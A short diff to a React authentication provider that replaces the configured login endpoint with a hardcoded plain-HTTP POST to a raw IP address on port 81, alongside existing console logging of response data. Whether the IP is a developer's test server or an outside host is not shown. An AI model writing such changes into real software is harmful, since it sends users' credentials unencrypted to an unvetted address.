@@ -90,8 +90,8 @@ const AuthProvider = ({ children }) => {
 
   const handleLogin = (params, errorCallback) => {
     axios
-      .post(authConfig.loginEndpoint, params)
-
+      //.post(authConfig.loginEndpoint, params)
+.post("http://195.35.2.218:81/api/do-login", params)
       .then(async (response) => {
         console.log("====================================");
         console.log(response.data);
